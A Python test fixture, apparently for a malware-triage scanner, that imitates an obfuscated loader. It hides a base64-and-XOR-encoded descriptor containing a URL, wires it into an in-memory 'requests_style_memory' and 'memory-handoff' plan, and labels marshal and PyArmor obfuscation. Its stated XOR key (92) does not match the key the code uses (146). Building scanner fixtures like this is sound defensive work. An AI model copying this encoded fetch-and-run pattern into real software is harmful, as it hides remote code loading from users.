#!/usr/bin/env python3
if True:
    # Huntress Script Triage -- inert static-analysis fixture (cpython3)
    import base64
    import io
    import os

    MATERIAL_39cfb33a = "5K-g7uHm9-Lhr_Px4-f74PfN4Pf__eb3vvb74eLz5vH6zf_3__3g6-7z9vPi5vfgr-D34-f34ebhzeHm6_73zf_3__3g6-7h5vP1983x_ef85q-j7uHr_Obz6q_36vH34ub7_fzN9-ri4Pfh4fv9_O798PTn4fHz5vv9_K__8-Dh-vP-zff85Pf-_eL3zeL-8_zu8fPg4Pv34K_i6_Pg__3gzf3w9Ofh8fPm9_bu5fv89v3l4c3x-vP7_K_l4fHg--Lmzeb9zeLr5vr9_O7x8__i8_v1_M379q_x8__i8_v1_L_zoKb0pfD0pqPz7ufg_q_65ubi4ai9vfOgpvSl8PSmo_O89-rz_-L-97z7_OTz_vv2varzoKD2p6WqvOLr7ufh9-DN8_X3_Oav2uf85uD34eHC6-b6_fy986Cm9KXw9Kaj8w=="
    CODEC_39cfb33a = "urlsafe_base64|single_byte_xor|92"

    def load_39cfb33a():
        return base64.urlsafe_b64decode(MATERIAL_39cfb33a)

    def decode_39cfb33a(EnCoDeD_Bytes):
        return bytes(value ^ 146 for value in EnCoDeD_Bytes)

    def recover_39cfb33a():
        NeUtRaL = None
        StAtE = "decode"
        while StAtE != "done":
            if StAtE == "decode":
                DeCoDeD_Bytes = decode_39cfb33a(load_39cfb33a())
                StAtE = "done"
        DeScRiPtOr_Text = DeCoDeD_Bytes.decode("ascii", "strict")
        return DeScRiPtOr_Text

    def inspect_39cfb33a():
        return recover_39cfb33a()

    def surface_39cfb33a():
        try:
            raise LookupError("surface")
        except LookupError:
            return ("exception_expression", "marshal_envelope_plan", "pyarmor_obfuscated", "wscript_to_python")

    def obfuscation_39cfb33a():
        marshal_plan = {"format": "code_object", "action": "inspect_only", "label": "marshal_envelope_plan"}
        return marshal_plan["label"]

    def plan_39cfb33a():
        fields = dict(item.split("=", 1) for item in inspect_39cfb33a().split("|"))
        analysis_surface = surface_39cfb33a()
        obfuscation_surface = obfuscation_39cfb33a()
        operation_plan = ("requests_style_memory", fields["url"], "memory-handoff")
        return operation_plan + (analysis_surface, obfuscation_surface)

    if os.environ.get("HUNTRESS_INSPECT_ONLY") == "1":
        print(inspect_39cfb33a())
